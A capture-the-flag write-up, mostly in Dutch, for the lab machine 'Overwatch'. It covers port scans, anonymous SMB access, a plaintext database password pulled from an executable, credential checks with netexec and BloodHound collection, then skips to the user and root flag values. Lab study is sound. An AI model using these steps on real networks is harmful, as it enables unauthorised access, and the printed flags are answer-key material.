# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Overwatch]
└─$ nmap 10.129.244.81                                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 13:06 CET
Nmap scan report for 10.129.244.81
Host is up (0.028s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/Overwatch]
└─$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV  10.129.244.81
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 13:07 CET
Nmap scan report for 10.129.244.81
Host is up (0.059s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-26 12:08:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-26T12:08:06
|_  start_date: N/A
|_clock-skew: -1s
```

Ik kan zien dat er een smb poort openstaat. We hebben geen credentials gekregen, dus zal ik een scan gaan doen op de smb server door gebruik te maken van de anonymous user. Zoals je hieronder zult kunnen zien heb ik lees rechten op de IPC en de Software disk. 

```
┌──(kali㉿kali)-[~/HTB/Overwatch]
└─$ smbmap -H 10.129.244.81 -u anonymous                                                                             
[+] IP: 10.129.244.81:445       Name: overwatch.htb             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        software$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
```

Ik zal als eerst gaan kijken op de software disk. Misshien dat er meer informatie daarop te vinden is.

```
┌──(kali㉿kali)-[~/HTB/Overwatch]
└─$ smbclient \\\\overwatch.htb\\software$ -U anonymous
```

Ik ben door gebruik te maken de volgende commando's de volledige directory van de smb server gaan halen en gaan zetten naar mijn eigen computer.

```
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget Monitoring
Get directory Monitoring? yes
```

Als je het goed gedaan hebt dan zou je het volgende op u eigen machine moeten kunnen zien.

```
┌──(kali㉿kali)-[~/HTB/Overwatch]
└─$ ls Monitoring                    
EntityFramework.dll                      overwatch.exe.config         System.Management.Automation.dll
EntityFramework.SqlServer.dll            overwatch.pdb                System.Management.Automation.xml
EntityFramework.SqlServer.xml            System.Data.SQLite.dll       x64
EntityFramework.xml                      System.Data.SQLite.EF6.dll   x86
Microsoft.Management.Infrastructure.dll  System.Data.SQLite.Linq.dll
overwatch.exe                            System.Data.SQLite.xml
```

Zoals je hierboven kunt zien zijn er veel interessante zaken die je kan gebruiken. Ik ben als eerst gaan zoeken in de Monitoring Directory of er geen username en password gekent is in de files en zoals je zelf zal kunnen zien is er geen informatie dat gevonden wordt. Ik ben dus gaan kijken naar het .exe bestand en als je daar naar zal kijken zal je kunnen zien dat er een username en een password gevonden wordt.

```
┌──(kali㉿kali)-[~/HTB/Overwatch/Monitoring]
└─$ cat overwatch.exe  
Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv
```

Nu dat ik de user credentials heb, ben ik eerst gaan kijken of dat ik met deze user de gegevens van de ldap server kan gaan halen en of ik met deze user ook kan inloggen op de smb server. Zoals je hieronder kan zien heeft deze user toegang tot beide.

```
┌──(kali㉿kali)-[~/HTB/Overwatch/Monitoring]
└─$ netexec ldap overwatch.htb -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv'                      
LDAP        10.129.244.81   389    S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
LDAP        10.129.244.81   389    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 

┌──(kali㉿kali)-[~/HTB/Overwatch/Monitoring]
└─$ netexec smb overwatch.htb -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --shares 
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:False)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
SMB         10.129.244.81   445    S200401          [*] Enumerated shares
SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
SMB         10.129.244.81   445    S200401          -----           -----------     ------
SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.244.81   445    S200401          C$                              Default share
SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.244.81   445    S200401          NETLOGON        READ            Logon server share 
SMB         10.129.244.81   445    S200401          software$       READ            
SMB         10.129.244.81   445    S200401          SYSVOL          READ            Logon server share 
```

Ik zal dus als eerst nu de gegevens van de ldap server gaan afhalen en de zip file naar mijn gekozen directory gaan kopieren.

```
┌──(kali㉿kali)-[~/HTB/Overwatch]
└─$ nxc ldap 10.129.244.81 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --bloodhound --collection All --dns-server 10.129.244.81
LDAP        10.129.244.81   389    S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
LDAP        10.129.244.81   389    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
LDAP        10.129.244.81   389    S200401          Resolved collection methods: container, localadmin, acl, rdp, objectprops, session, psremote, trusts, dcom, group                                                                   
LDAP        10.129.244.81   389    S200401          Done in 00M 07S
LDAP        10.129.244.81   389    S200401          Compressing output into /home/kali/.nxc/logs/S200401_10.129.244.81_2026-01-26_132632_bloodhound.zip  

┌──(kali㉿kali)-[~/HTB/Overwatch/Monitoring]
└─$ cp /home/kali/.nxc/logs/S200401_10.129.244.81_2026-01-26_132632_bloodhound.zip ../
```




User Flag
```
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> cat user.txt
280dd7215a375f72e73caf3e7b71becd
```

Root Flag 
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
f3cb2b7297f5783022a0cbb27f0d71d1
```

![[Pasted image 20260126162441.png]]